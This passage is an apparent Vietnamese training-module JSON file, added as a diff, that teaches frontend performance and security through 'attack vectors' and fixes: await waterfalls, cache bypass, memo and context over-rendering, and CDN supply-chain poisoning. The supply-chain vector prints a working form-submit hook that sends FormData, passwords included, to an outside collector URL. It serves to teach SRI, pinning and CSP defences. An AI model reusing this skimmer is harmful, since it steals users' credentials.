@@ -1,0 +1,563 @@
+{
+  "id": "rt-resource-supply-drain",
+  "slug": "resource-supply-drain",
+  "phaseId": "phase-05",
+  "orderInPhase": 1,
+  "title": "Cạn kiệt tài nguyên & Phá hạ tầng",
+  "tagline": "Waterfall tuần tự kéo dài TTFB, dynamic rendering storm đè bẹp database, reference storm vô hiệu memo, compute nặng đóng băng main thread — DoS đến từ chính code frontend.",
+  "missionBriefing": "Nhiệm vụ: drain hạ tầng theo 5 kiểu — xếp hàng await làm chết TTFB, kích bão dynamic render đánh sập DB, bão tham chiếu phá memo, siege main thread bằng compute nặng, và phát sóng re-render toàn cây qua context monolith. Đọc Blast Radius ở quy mô production, rồi vá bằng parallelize/memoization/tách context cho đến khi toàn bộ vector PATCHED.",
+  "difficulty": "advanced",
+  "iconName": "Boxes",
+  "color": "from-amber-500 to-rose-600",
+  "vectors": [
+    {
+      "id": "na-vec-02",
+      "name": "Sequential Waterfall Trap",
+      "severity": "high",
+      "category": "Request Waterfall",
+      "target": "RSC awaits fetch tuần tự trong DashboardPage",
+      "story": "Dashboard awaits user, rồi orders, rồi recommendations — ba fetch xếp hàng dù hai cái sau chỉ cần user.id. TTFB bằng TỔNG độ trễ thay vì cái dài nhất: gần 2 giây trước khi byte HTML đầu tiên rời server. Đợt marketing đầu tiên, dashboard trở thành trang chậm nhất hệ thống và Core Web Vitals rơi tự do.",
+      "payloadCode": "// app/dashboard/page.tsx (RSC)\n// ❌ Ba fetch xếp hàng một — tổng độ trễ là CỘNG DỒN, không phải MAX\nexport default async function DashboardPage() {\n  const user = await getUser();                    // ~400ms\n  const orders = await getOrders(user.id);         // ~600ms (chỉ cần user.id)\n  const recos = await getRecommendations(user.id); // ~900ms (cũng chỉ cần user.id)\n\n  // ⏱️ ~1.900ms trước khi byte HTML ĐẦU TIÊN rời server\n  return (\n    <>\n      <ProfileCard user={user} />\n      <OrdersTable orders={orders} />\n      <RecoCarousel items={recos} />\n    </>\n  );\n}\n\n// Trên 3G thật: 1.9s server + 800ms mạng ≈ màn hình trắng gần 3 giây.",
+      "impactLog": [
+        "$ trace: getUser 402ms → getOrders 611ms → getRecos 887ms",
+        "> execution: SEQUENTIAL — zero overlap, mỗi await chờ cái trước nó",
+        "> TTFB /dashboard: 1.94s (ngân sách đề ra: 500ms)",
+        "WARNING: LCP 3.6s — Core Web Vitals FAIL trên mobile",
+        "HIGH: mỗi +100ms latency ≈ −1% conversion (benchmark Akamai)",
+        "CRITICAL: DB cold-start + traffic đột biến → chuỗi await đứt từng đoạn, timeout dây chuyền"
+      ],
+      "blastRadius": [
+        "TTFB bằng tổng các fetch thay vì max: chậm nhân bản, lãng phí hạ tầng vô nghĩa.",
+        "Conversion và SEO tụt thẳng: mỗi trăm mili-giây chậm là doanh thu rơi ra.",
+        "Worker giữ connection lâu hơn → throughput server giảm mạnh đúng lúc tải cao.",
+        "Một fetch chậm làm treo cả page — timeout dây chuyền trên mọi tầng."
+      ],
+      "defenseName": "Promise.all Parallelism + Early Streaming",
+      "defenseCode": "// ✅ Song song hoá những gì có thể — chỉ chờ dependency THẬT SỰ\nexport default async function DashboardPage() {\n  const user = await getUser(); // ~400ms — dependency duy nhất\n\n  // ✅ orders & recos chạy ĐỒNG LÚC: 600ms + 900ms → chỉ tốn ~900ms\n  const [orders, recos] = await Promise.all([\n    getOrders(user.id),\n    getRecommendations(user.id),\n  ]);\n  // ⏱️ TTFB mới: ~1.3s → tối ưu tiếp ở bước 2 nếu vẫn chưa đủ\n\n  return (\n    <>\n      <ProfileCard user={user} />\n      <OrdersTable orders={orders} />\n      <RecoCarousel items={recos} />\n    </>\n  );\n}\n\n// 2) Fetch không phụ thuộc gì? KHÔNG await ở page — nhét component tự fetch\n//    vào <Suspense> để stream riêng: <Suspense><RecoSection /></Suspense>\n// 3) Hoặc preload sớm ở layout với React cache() rồi await/use() ở leaf.",
+      "defenseTakeaway": "Vẽ sơ đồ dependency của các fetch: độc lập thì Promise.all, không chặn nội dung chính thì đẩy xuống Suspense stream."
+    },
+    {
+      "id": "na-vec-03",
+      "name": "Dynamic Rendering Storm",
+      "severity": "medium",
+      "category": "Cache Bypass Flood",
+      "target": "force-dynamic + fetch cache:'no-store' áp dụng toàn cục",
+      "story": "Sau một sự cố dữ liệu cũ, team 'vá' bằng cách rải force-dynamic và no-store khắp app — hết stale, đổi lại MỌI request đều đấm xuống database. Ngày hội sale, 48 nghìn request/phút đổ vào: connection pool cạn trong 90 giây, p99 lên 28 giây và trang sập đúng giờ vàng doanh thu. Chi phí 'giải cứu' là nhân bản DB — thứ mà lớp cache CDN vốn làm miễn phí.",
+      "payloadCode": "// ❌ Hậu quả của nỗi sợ dữ liệu cũ: render động TẤT CẢ\n// app/products/page.tsx\nexport const dynamic = 'force-dynamic'; // static generation bị vô hiệu hoá\nexport const revalidate = 0;\n\nasync function getProducts() {\n  const res = await fetch('https://api.internal/products', {\n    cache: 'no-store',       // 💥 100% request → origin/DB\n    next: { revalidate: 0 },\n  });\n  return res.json();\n}\n\nexport default async function ProductsPage() {\n  const products = await getProducts(); // mỗi user = một lượt SELECT *\n  return <ProductGrid items={products} />;\n}\n\n// 🎯 11:00 chiến dịch mở bán: 48k req/phút\n// → pool 20 connections cạn, queue 1.200+, p99 28s, 5xx 34%",
+      "impactLog": [
+        "$ 11:00 campaign live — traffic 48.000 req/min",
+        "> MỖI request: force-dynamic → render + SELECT * FROM products",
+        "> db pool: 20/20 connections BUSY — queue depth 1.204",
+        "WARNING: p99 28s, error rate 5xx = 34%, health check bắt đầu fail",
+        "CRITICAL: SITE DOWN trong giờ vàng — doanh thu mất ước tính 800 triệu",
+        "FATAL: 'giải pháp' tạm thời = thêm DB replica → hoá đơn infra ×4"
+      ],
+      "blastRadius": [
+        "Sập đúng giờ vàng doanh thu — thiệt hại trực tiếp cộng hậu quả truyền thông.",
+        "Chi phí infra tăng vĩnh viễn: scale DB để bù thứ mà cache CDN làm miễn phí.",
+        "Cold render mọi request: CPU node chạy full chỉ để tái tạo cùng một HTML.",
+        "Sự cố lặp lại theo lịch campaign: mỗi đợt traffic là một đợt downtime."
+      ],
+      "defenseName": "Next.js 16 Cache Components: Static Shell + Tagged Revalidation",
+      "defenseCode": "// ✅ Next.js 16: cache là opt-in, freshness và invalidation được khai báo rõ\n// next.config.ts (ứng dụng có Next.js runtime): { cacheComponents: true }\n\n// app/products/page.tsx\nimport { cacheLife, cacheTag } from 'next/cache';\n\nasync function getProducts() {\n  'use cache';\n  cacheLife('minutes');\n  cacheTag('products');\n\n  const res = await fetch('https://api.internal/products');\n  if (!res.ok) throw new Error(`Products failed: ${res.status}`);\n  return res.json();\n}\n\nexport default async function ProductsPage() {\n  const products = await getProducts();\n  return <ProductGrid items={products} />;\n}\n\n// app/api/products/revalidate/route.ts — CMS/webhook làm stale đúng tag\nimport { revalidateTag } from 'next/cache';\nexport async function POST(req: Request) {\n  await verifyCmsSignature(req);\n  revalidateTag('products', 'max'); // stale-while-revalidate\n  return Response.json({ revalidated: true });\n}\n\n// Mutation cần read-your-own-writes trong Server Action thì dùng updateTag('products').\n// Static export GitHub Pages không có runtime cache: cập nhật cần build/deploy mới hoặc client data source.",
+      "defenseTakeaway": "Với Next.js 16, dùng 'use cache' + cacheLife/cacheTag để mô tả policy; chọn updateTag cho read-your-own-writes hoặc revalidateTag(tag, 'max') cho stale-while-revalidate, và luôn xét deployment có runtime hay chỉ static export."
+    },
+    {
+      "id": "rpp-vec-01",
+      "name": "Referential Identity Storm",
+      "severity": "high",
+      "category": "Memoization Bypass",
+      "target": "React.memo shallow prop comparison",
+      "story": "React.memo đứng gác cổng với shallow compare — nhưng parent mỗi giây lại sinh ra object, mảng, arrow function hoàn toàn mới để đưa xuống. Tham chiếu khác nhau nghĩa là props 'đã đổi': 2000 row memoized đồng loạt re-render mỗi giây như bị lệnh tổng động viên. Cái giá: 43ms paint mỗi nhịp, FPS rơi từ 60 xuống 24 ngay trên laptop dev xịn nhất của team.",
+      "payloadCode": "// ❌ Props object/function LITERAL mới mỗi render → React.memo vô dụng\nconst ProductRow = React.memo(function ProductRow({ product, theme, onSelect }: {\n  product: Product;\n  theme: { fg: string };\n  onSelect: (id: string) => void;\n}) {\n  return <li style={{ color: theme.fg }} onClick={() => onSelect(product.id)}>{product.name}</li>;\n});\n\n// Parent re-render mỗi giây (giá stock) → 3 props MỚI sinh mỗi giây\nfunction ProductBoard() {\n  const [tick, setTick] = useState(0);\n  useEffect(() => {\n    const id = setInterval(() => setTick((t) => t + 1), 1000);\n    return () => clearInterval(id);\n  }, []);\n  const theme = { fg: '#e5e7eb' };              // ❌ object mới mỗi render\n  const handleSelect = (id: string) => buy(id); // ❌ hàm mới mỗi render\n  return products.map((p) => (\n    <ProductRow key={p.id} product={p} onSelect={handleSelect} theme={theme} />\n  ));\n}",
+      "impactLog": [
+        "$ t+1000ms → setTick → ProductBoard re-render",
+        "> theme: {..} !== {..} → shallow compare FAIL",
+        "> onSelect: fn@0x1a2b !== fn@0x9c4d → compare FAIL",
+        "> React.memo BYPASSED ×2000 rows mỗi giây",
+        "HIGH: commit 2000 rows/s — paint 43ms, FPS rơi từ 60 còn 24",
+        "CRITICAL: fan quay điên loạn, user cuộn bảng giật khung hình"
+      ],
+      "blastRadius": [
+        "Mọi bảng/danh sách dài trong app chậm dần theo đúng tỉ lệ số row × tần suất re-render parent.",
+        "Pin laptop/mobile tụt nhanh, máy nóng — user đổ lỗi cho 'app nặng' dù server rất khỏe.",
+        "Memo hóa thủ công trở thành trang trí: team mất niềm tin vào React.memo và bắt đầu tối ưu mù.",
+        "Profiler cho thấy 70-80% commit là wasted renders — công sức render bỏ sông bỏ biển."
+      ],
+      "defenseName": "Stable Reference Discipline",
+      "defenseCode": "// ✅ Khóa tham chiếu: useMemo cache object, useCallback giữ nguyên fn\n\n// 1) useCallback cho handler truyền xuống memo component\nconst handleSelect = useCallback((id: string) => buy(id), []);\n\n// 2) useMemo cho object/config được tạo trong render\nconst theme = useMemo(() => ({ fg: '#e5e7eb' }), []);\n\n// 3) Hằng số tĩnh khai báo NGOÀI component — rẻ nhất, ổn định tuyệt đối\nconst THEME = { fg: '#e5e7eb' };\n\n// 4) Prop có thể suy ra từ primitive? Truyền primitive thay vì object\n<ProductRow selected={p.id === selectedId} />\n\n// 5) React Compiler tự memo hóa — nhưng kỷ luật tham chiếu vẫn cần thiết\n// khi làm việc với thư viện ngoài hoặc code legacy chưa qua compiler\n\n// 6) Đo trước khi tối ưu: React DevTools Profiler → 'Highlight updates'",
+      "defenseTakeaway": "React.memo so sánh bằng tham chiếu: mọi object/function đưa xuống phải được useMemo/useCallback giữ nguyên định danh giữa các lần render."
+    },
+    {
+      "id": "rpp-vec-02",
+      "name": "Render-Body Compute Siege",
+      "severity": "high",
+      "category": "Main Thread Block",
+      "target": "Component render phase (filter/sort 10k rows)",
+      "story": "Thân component lọc và sắp xếp 10.000 giao dịch NGAY TRONG lúc render — không cache, không defer. Mỗi phím gõ vào ô tìm kiếm là một đợt O(n log n) quét toàn bộ dữ liệu trên main thread, chặn luôn cả cỗ máy gõ chữ. Trên mobile tầm trung, user gõ trước và... chữ hiện sau nửa giây, INP cháy đỏ trong Core Web Vitals.",
+      "payloadCode": "// ❌ Filter + sort 10.000 dòng NGAY trong thân component\nfunction TransactionsTable({ query }: { query: string }) {\n  const [sortKey, setSortKey] = useState<'date' | 'amount'>('date');\n\n  // Chạy LẠI ở MỌI render — kể cả render do state KHÁC gây ra\n  const rows = allTransactions\n    .filter((tx) => tx.merchant.toLowerCase().includes(query.toLowerCase()))\n    .sort((a, b) =>\n      sortKey === 'date' ? b.date.localeCompare(a.date) : b.amount - a.amount,\n    );\n\n  return (\n    <>\n      <SearchBox onChange={setQuery} />   {/* gõ 1 ký tự = quét lại 10k dòng */}\n      <SortHeader onClick={() => setSortKey('amount')} />\n      {rows.slice(0, 50).map((tx) => (\n        <TxRow key={tx.id} tx={tx} />\n      ))}\n    </>\n  );\n}",
+      "impactLog": [
+        "$ keystroke 'v' → setQuery → render begin",
+        "> filter(10.000) + sort(10.000) = O(n log n) trên main thread",
+        "> blocking 187ms — input echo trễ sau từng ký tự",
+        "WARNING: INP 480ms vượt ngưỡng 'poor' của Core Web Vitals",
+        "HIGH: mobile tầm trung 640ms/block — gõ trước chữ hiện sau",
+        "CRITICAL: dashboard poll 1s × render nặng = pin tụt 18%/giờ"
+      ],
+      "blastRadius": [
+        "Mỗi phím gõ đốt O(n log n) CPU trên main thread — toàn UI đóng băng theo từng lần render.",
+        "Core Web Vitals INP đỏ thẫm: SEO tụt hạng với trang công cụ tìm kiếm nội bộ.",
+        "Trên mobile, pin và nhiệt độ tăng vọt — user buộc đóng tab giữa phiên làm việc.",
+        "Render thừa nhân theo số widget cùng trang: thêm 1 chart là mọi thứ chậm gấp đôi."
+      ],
+      "defenseName": "useMemo Cache + Virtualization",
+      "defenseCode": "// ✅ Cache kết quả tính nặng + chỉ render phần nhìn thấy\n\n// 1) useMemo: chỉ tính lại khi query/sortKey THẬT SỰ đổi\nconst rows = useMemo(() => {\n  const q = query.toLowerCase();\n  return allTransactions\n    .filter((tx) => tx.merchant.toLowerCase().includes(q))\n    .toSorted(comparator(sortKey)); // không mutate mảng gốc\n}, [query, sortKey]);\n\n// 2) Move-down: đẩy state gõ phím xuống con SearchBox\n// → parent (và cả bảng) không re-render khi đang gõ\n\n// 3) Virtualize 10k+ rows — chỉ mount ~20 row đang visible\n// npm i @tanstack/react-virtual\nconst virtualizer = useVirtualizer({\n  count: rows.length,\n  getScrollElement: () => scrollRef.current,\n  estimateSize: () => 48,\n});\n\n// 4) useDeferredValue(query): React ưu tiên keystroke, trì hoãn bảng",
+      "defenseTakeaway": "Compute nặng phải nằm sau useMemo với deps chuẩn xác, state gõ phím đẩy xuống con, và danh sách 10k+ thì virtualize — main thread là tài sản quý."
+    },
+    {
+      "id": "rpp-vec-03",
+      "name": "Monolith Context Blast",
+      "severity": "critical",
+      "category": "Context Over-render",
+      "target": "Global context subscriber tree",
+      "story": "Một AppContext duy nhất nhét user, theme, cart, alerts — bốn domain chung sống trong một value object. Chỉ cần một toast notification xuất hiện, value đổi tham chiếu và React phát sóng re-render tới TẤT CẢ 412 consumer. React.memo bất lực trước useContext: đây là đường hầm riêng mà shallow compare không thể canh chừng.",
+      "payloadCode": "// ❌ Một context Ô MON chứa mọi domain state\nconst AppContext = createContext<AppState | null>(null);\n\nfunction AppProvider({ children }: { children: React.ReactNode }) {\n  const [user, setUser] = useState<User>();\n  const [theme, setTheme] = useState<'light' | 'dark'>('dark');\n  const [cart, setCart] = useState<CartItem[]>([]);\n  const [alerts, setAlerts] = useState<Alert[]>([]);\n\n  // value MỚI sau MỖI setState bất kỳ → broadcast toàn cây\n  const value = { user, setUser, theme, setTheme, cart, setCart, alerts, setAlerts };\n  return <AppContext.Provider value={value}>{children}</AppContext.Provider>;\n}\n\n// Mọi consumer re-render khi alerts đổi — kể cả component memo:\nconst PriceTag = React.memo(function PriceTag() {\n  const { cart } = useApp(); // useContext BỎ QUA React.memo\n  return <b>{cart.reduce((s, i) => s + i.price, 0)}₫</b>;\n});",
+      "impactLog": [
+        "$ setAlerts([toast mới]) → value identity changed",
+        "> Context broadcast → MỌI useContext(AppContext) re-render",
+        "> 412 consumers re-render vì 1 toast notification",
+        "HIGH: Header, Sidebar, DataTable... diff lại vô nghĩa hàng loạt",
+        "CRITICAL: interaction latency 320ms — vượt budget 200ms",
+        "FATAL: Profiler kết luận: 78% render time là WASTED renders"
+      ],
+      "blastRadius": [
+        "Một toast hay đổi theme khiến cả dashboard nghìn component vẽ lại từ đầu.",
+        "React.memo vô hiệu trước useContext — mọi nỗ lực memo hóa thủ công thành trang trí.",
+        "Interaction latency vượt mốc 200ms: cảm giác 'app ì' dai dẳng dù cấu hình máy mạnh.",
+        "Nợ kiến trúc tích lũy: mỗi feature mới nhét thêm vào context chung càng phình blast radius."
+      ],
+      "defenseName": "Context Split + Selector Slices",
+      "defenseCode": "// ✅ Tách context theo domain + selector đọc đúng slice\n\n// 1) Split: mỗi domain một context nhỏ, provider lồng nhau\n<UserContext.Provider value={userValue}>       {/* useMemo theo deps */}\n<CartContext.Provider value={cartValue}>\n<AlertsContext.Provider value={alerts}>        {/* đổi hiếm → ít broadcast */}\n\n// 2) Zustand-style selector: component chỉ subscribe đúng field\nconst cartTotal = useCartStore((s) => s.total);     // re-render khi total đổi\nconst unread = useAlertStore((s) => s.unreadCount); // không dính toast khác\n\n// 3) Nguyên tắc chia:\n// - state đổi TẦN SUẤT cao tách khỏi state gần như tĩnh\n// - value và dispatch tách riêng (StateProvider / DispatchProvider)\n\n// 4) Đo lại bằng Profiler: mỗi action chỉ vài consumer re-render là đạt",
+      "defenseTakeaway": "Chia context theo domain hoặc chuyển sang store kiểu zustand với selector — component chỉ nên re-render khi đúng slice dữ liệu nó dùng thực sự thay đổi."
+    },
+    {
+      "id": "rt5-vec-01",
+      "name": "Supply Chain Script Hijack",
+      "severity": "critical",
+      "category": "Supply Chain",
+      "target": "Third-party CDN script & SRI policy",
+      "story": "track.min.js được load từ public CDN — không pin version ('để luôn nhận update'), không SRI ('thêm cho phức tạp'). Một ngày, maintainer account của package bị chiếm qua phishing: bản 'hotfix' @latest thêm 15 dòng hook mọi form submit và gửi FormData về collector lạ. Cache CDN TTL 24h nhân đôi sức công kích: mọi visitor của MỌI app dùng floating tag nhận keylogger — trong khi repo của bạn xanh CI, npm audit sạch, vì mã độc không bao giờ nằm trong codebase của bạn.",
+      "payloadCode": "<!-- ❌ app/layout.tsx — script third-party từ public CDN, floating + không SRI -->\n<script src=\"https://cdn.jsdelivr.net/npm/analytics-helper/track.min.js\"></script>\n<!-- ❌ Không pin version → 'latest' là CON TRỎ DI CHUYỂN: hôm nay là lib, ngày mai là payload -->\n<!-- ❌ Không integrity → nội dung đổi 1 byte cũng chạy NGAY, không một cảnh báo -->\n\n<!-- 🔓 Kịch bản đầu độc — maintainer account bị chiếm, publish 'hotfix' @latest: -->\n<script>\n  // +15 dòng trong bản vá 'giải quyết memory leak':\n  (function () {\n    document.addEventListener(\n      'submit',\n      (e) => navigator.sendBeacon(\n        'https://metrics-collect.sh/ingest',\n        new URLSearchParams(new FormData(e.target)).toString(), // ❌ email + password plaintext\n      ),\n      true, // capture phase — chạy TRƯỚC cả handler của app\n    );\n  })();\n</script>\n<!-- Cache CDN 24h × mọi visitor × mọi app dùng tag này = keylogger quy mô đại dịch -->",
+      "impactLog": [
+        "$ curl -s https://cdn.jsdelivr.net/npm/analytics-helper/track.min.js | diff - track.known-good.js",
+        "> +15 lines: addEventListener('submit', sendBeacon(...)) — keylogger capture phase",
+        "> SRI absent → browser executes modified payload WITHOUT any warning",
+        "WARNING: password field captured plaintext trước cả client-side encryption",
+        "CRITICAL: 12.400 credentials harvested/24h — repo của bạn CHƯA HỀ thay đổi một dòng",
+        "FATAL: incident response bế tắc — npm audit sạch, CI xanh, mã độc sống NGOÀI trust boundary"
+      ],
+      "blastRadius": [
+        "Keylogger/trojan chạy trên mọi visitor mọi trang: một phiên bản poisoned áp cho toàn bộ user base cùng lúc.",
+        "Credentials thu hoạch plaintext trước cả mã hóa: account takeover hàng loạt trong im lặng tuyệt đối.",
+        "Incident response mù: mã độc không trong repo, không trong lockfile — npm audit, SBOM, CI đều báo sạch.",
+        "Compliance sụp đổ: dữ liệu cá nhân rò qua third-party script vi phạm nghĩa vụ bảo vệ dữ liệu (GDPR/NĐ-CP 13)."
+      ],
+      "defenseName": "Self-host First + Pin Version + SRI + CSP Anchor",
+      "defenseCode": "<!-- ✅ 1) Gold standard: self-host — script sống cùng origin, trong trust boundary của bạn -->\n<script src=\"/vendor/analytics-helper-3.4.1.min.js\"></script>\n\n<!-- ✅ 2) Buộc dùng CDN? Pin version CHÍNH XÁC + SRI hash -->\n<script\n  src=\"https://cdn.jsdelivr.net/npm/analytics-helper@3.4.1/dist/track.min.js\"\n  integrity=\"sha384-K7b8nQvXz2Jm4LdP9wRfT6yHcVbNa1oQxEuFiGjSkBlMnOpQrStUvWyXzAbCdEfG\"\n  crossorigin=\"anonymous\"\n></script>\n<!-- ✅ Hash lệch 1 byte = browser REFUSE execute — bản poisoned tự vô hiệu -->\n\n<!-- ✅ 3) CSP khóa điểm neo: chỉ origin + hash đã duyệt, cấm https: wildcard -->\n<!-- Content-Security-Policy: script-src 'self' https://cdn.jsdelivr.net 'sha384-K7b8…'; -->\n\n// ✅ 4) Quy trình: Renovate/Dependabot review từng bump + verify diff release note;\n// CI regenerate SRI hash từ known-good build; vendor contract cam kết immutable release\n\n// ✅ 5) Runbook supply-chain alarm: switch self-hosted → rotate secrets → force CDN purge",
+      "defenseTakeaway": "Script từ CDN là ủy quyền code execution cho người lạ: self-host khi có thể, còn buộc dùng CDN thì pin version + SRI + CSP — ba lớp khiến bản vá độc tự vô hiệu trước khi chạy dòng đầu tiên."
+    }
+  ],
+  "missions": [
+    {
+      "id": "na-mis-02",
+      "slug": "sequential-waterfall-trap",
+      "title": "Chiến dịch 01 · Waterfall Tuần Tự: giết TTFB bằng chuỗi await xếp hàng",
+      "summary": "Ba lệnh await vô hại khi đọc riêng lẻ, nhưng xếp chồng trong cùng server component khiến user nhìn màn hình trắng đúng bằng tổng độ trễ của cả ba — mô phỏng hiện tượng waterfall và cách phá vỡ nó.",
+      "objective": "Chứng minh latency cộng dồn tuyến tính trong async component và hạ TTFB bằng cách song song hoá đúng chỗ.",
+      "difficulty": "advanced",
+      "estimatedMinutes": 20,
+      "vectorIds": ["na-vec-02"],
+      "rootCause": "Server component thực thi await theo thứ tự top-down: lệnh sau không bắt đầu trước khi lệnh trước trả về, dù hai lệnh chẳng liên quan dữ liệu gì nhau. Tổng thời gian render = tổng các độ trễ thay vì max của chúng — lỗi O(n) dễ nhận diện nhất nhưng lại phổ biến nhất vì code đọc \"logic\" theo kiểu tuần tự. Vấn đề nền tảng: developer quen lập trình bất đồng bộ theo luồng nghiệp vụ (lấy user rồi mới lấy đơn hàng) và áp cùng khuôn mẫu cho những truy vấn vốn độc lập.",
+      "reconNotes": [
+        "Đo TTFB ở Network tab: response bắt đầu sau >800ms dù payload nhỏ là dấu hiệu render chờ.",
+        "Đọc server component: đếm số await đứng trước return JSX — mỗi await là một nấc waterfall.",
+        "Soi log server: các query timestamp nối đuôi nhau chứng minh chúng chạy tuần tự.",
+        "Thử ở mạng 3G chậm: waterfall càng nghiêm trọng vì mỗi nấc cộng thêm RTT."
+      ],
+      "killChain": [
+        {
+          "title": "1 · Dựng chuỗi await tuần tự",
+          "detail": "Trang dashboard await ba nguồn dữ liệu độc lập: profile, thông báo, thống kê — viết nối tiếp vì \"đọc dễ hơn\".",
+          "code": "const user = await getUser();\nconst notifications = await getNotifications();\nconst stats = await getStats(); // 3×300ms = 900ms trước khi render"
+        },
+        {
+          "title": "2 · User chịu cộng dồn",
+          "detail": "TTFB = 300+300+300ms. Ở 3G cộng RTT mỗi nấc, con số thực tế người dùng cảm nhận là hơn 2 giây màn hình trắng.",
+          "code": "// timeline: |--user--||--notif--||--stats--| → first byte at 900ms+"
+        },
+        {
+          "title": "3 · Nhân rộng bởi cache miss",
+          "detail": "Khi Redis lạnh, mỗi nứơc trượt cache đẩy độ trễ nấc đó từ 300ms lên 2s — p99 của cả trang nổ tung theo cấp số.",
+          "code": "// p50: 0.9s · p95 (1 cache miss): 2.6s · p99 (2 misses): 4.3s"
+        },
+        {
+          "title": "4 · Hiệu ứng dây chuyền",
+          "detail": "TTFB cao kéo Core Web Vitals (LCP) vượt ngưỡng, SEO tụt hạng, conversion giảm — hậu quả kinh doanh của một decision \"để code dễ đọc\".",
+          "code": "Lighthouse: LCP 4.1s (poor) · Organic traffic -23% trong 30 ngày"
+        }
+      ],
+      "hardeningChecklist": [
+        "Các await độc lập phải gom vào Promise.all — chỉ tuần tự hoá khi output của bước này là input bước kia.",
+        "Dữ liệu không chặn layout nên chuyển xuống Suspense boundary để stream, không await ở thân component.",
+        "Đặt ngân sách TTFB (ví dụ <500ms) và cảnh báo trong CI qua Lighthouse/perf test.",
+        "Theo dõi p99 chứ không chỉ trung bình: waterfall lộ rõ nhất ở phân vị cao khi cache trượt.",
+        "Review rule: mỗi await mới trong server component phải trả lời \"nó phụ thuộc dữ liệu của await trên không?\""
+      ],
+      "debrief": [
+        {
+          "question": "Promise.all có nhược điểm gì so với streaming từng phần?",
+          "answer": "Promise.all vẫn chờ nốt chậm nhất trước khi render — nhanh hơn tuần tự nhưng user vẫn nhìn trắng đến lúc đó. Streaming với Suspense cho phép gửi shell ngay, từng khối dữ liệu đổ về khi sẵn sàng, nên trải nghiệm perceived performance tốt hơn hẳn dù tổng thời gian dữ liệu đầy đủ tương đương."
+        },
+        {
+          "question": "Khi nào tuần tự là ĐÚNG chứ không phải waterfall xấu?",
+          "answer": "Khi bước sau phụ thuộc kết quả bước trước (lấy userId rồi mới fetch orders của user đó) hoặc khi bước sau có xác suất fail sớm rẻ hơn. Phân biệt bằng câu hỏi: bỏ await đầu, bước sau có còn nghĩa lý không? Nếu có — chúng độc lập và phải song song."
+        }
+      ]
+    },
+    {
+      "id": "na-mis-03",
+      "slug": "dynamic-rendering-storm",
+      "title": "Chiến dịch 02 · Dynamic Rendering Storm: bão request đè bẹp database",
+      "summary": "Một dòng force-dynamic tiện tay khiến mỗi request đều đánh database thật: mô phỏng bot flood biến quyết định caching lười thành sự cố sập toàn site, kể cả những route vốn tĩnh.",
+      "objective": "Kích hoạt tình trạng cạn connection pool bằng lưu lượng bình thường và thiết kế lớp cache giúp site sống sót qua chính cơn bão đó.",
+      "difficulty": "advanced",
+      "estimatedMinutes": 20,
+      "vectorIds": ["na-vec-03"],
+      "rootCause": "Dynamic rendering nghĩa là server render mới cho MỌI request — không có bản cache nào giữa server và user. Khi trang đó đồng thời chạy query nặng, throughput của hệ thống bị chặn trên bởi connection pool của database, thường chỉ vài chục kết nối. Bot crawler và health-checker nhân lưu lượng lên gấp trăm lần mà không tốn thêm chi phí hạ tầng của chúng. Lỗi kiến trúc gốc: chọn chế độ render theo sự tiện lợi của code (\"dữ liệu luôn mới\") thay vì theo đặc điểm traffic của trang, mà không đặt bất kỳ lớp buffer nào giữa request và database.",
+      "reconNotes": [
+        "Soi response header: Cache-Control: no-store hoặc thiếu x-nextjs-cache là dấu hiệu route render động hoàn toàn.",
+        "Quan sát DB monitor: mỗi pageview sinh đúng một cụm query giống hệt — tỷ lệ cache hit bằng 0.",
+        "Kiểm tra robots/health-check: những request đều đặn 10s/lần cũng đánh thẳng DB như user thật.",
+        "Đo connection pool: max connections thấp hơn peak concurrent requests là quả bom hẹn giờ."
+      ],
+      "killChain": [
+        {
+          "title": "1 · Chọn tiện lợi thay vì kiến trúc",
+          "detail": "Trang báo giá cần giá realtime nên team đặt force-dynamic + no-store — một dòng code xoá sạch mọi layer cache.",
+          "code": "export const dynamic = \"force-dynamic\";\nexport const revalidate = 0; // mọi request → render mới + query mới"
+        },
+        {
+          "title": "2 · Traffic thường ngày vẫn… sống",
+          "detail": "Với 50 user đồng thời, pool 100 connections còn đủ. Hệ thống \"chạy tốt trong demo\" — mồi cháy đã được cài.",
+          "code": "peak concurrent=50 · pool=100 · db cpu=35% → tất cả xanh"
+        },
+        {
+          "title": "3 · Kích nổ: bão crawler",
+          "detail": "Một search engine re-index + vài health-check cấu hình sai đẩy 1500 request/phút — mỗi cái mở connection chờ query 400ms.",
+          "code": "1500 rpm × 400ms ≈ 10 concurrent/query liên tục\n→ pool exhausted · queue length ↑↑ · timeout 500"
+        },
+        {
+          "title": "4 · Sập dây chuyền toàn site",
+          "detail": "Pool cạn khiến cả những route tĩnh cần verify session cũng treo — sự cố lan từ một trang sang toàn app vì chung một pool.",
+          "code": "FATAL: remaining connection slots are reserved\nGET /login → 500 (không liên quan nhưng chết theo)"
+        }
+      ],
+      "hardeningChecklist": [
+        "Mặc định tĩnh trước, động có chủ đích sau: chỉ force-dynamic khi thực sự cần dữ liệu từng-request và đã có buffer.",
+        "Đặt lớp cache phía trước DB (ISR/revalidate, Redis, CDN) với TTL phù hợp độ tươi dữ liệu thực tế.",
+        "Giới hạn rate-limit + bot management ở edge để lưu lượng không hợp lệ không chạm render layer.",
+        "Connection pooling (PgBouncer/prisma pool) + giám sát pool saturation làm alert cấp cao.",
+        "Load-test kịch bản cache-miss trước mỗi release lớn: p99 dưới tải 5× bình thường phải còn sống."
+      ],
+      "debrief": [
+        {
+          "question": "Vì sao sự cố lan được sang cả những route KHÔNG dùng database?",
+          "answer": "Vì tài nguyên bị cạn là dùng chung: connection pool, CPU, memory của process render phục vụ toàn app. Khi pool cạn, middleware verify session cũng cần query cũng treo theo. Sự cố động luôn có tính lan truyền qua tài nguyên chia sẻ — đó là lý do phải cô lập bằng cache layer thay vì để mọi request chạm tài nguyên chung."
+        },
+        {
+          "question": "ISR khác gì force-dynamic + Redis tự xây?",
+          "answer": "ISR gắn stale-while-revalidate vào chính pipeline render: user luôn nhận bản cached tức thì trong khi background làm mới — p99 ổn định không phụ thuộc DB. Tự xây bằng Redis chỉ cache DỮ LIỆU nhưng vẫn render lại mỗi request, nên chi phí CPU render vẫn tuyến tính với traffic. Nguyên tắc: cache càng gần user càng tốt."
+        }
+      ]
+    },
+    {
+      "id": "rpp-mis-01",
+      "slug": "referential-storm-render",
+      "title": "Chiến dịch 03 · Bão tham chiếu: phá React.memo bằng một object inline",
+      "summary": "Memo đã bọc, checklist đã tối ưu — nhưng một style={{}} và một arrow function trong JSX khiến 500 row re-render mỗi keystroke. Truy vết qua Profiler và dựng giao thức tham chiếu ổn định.",
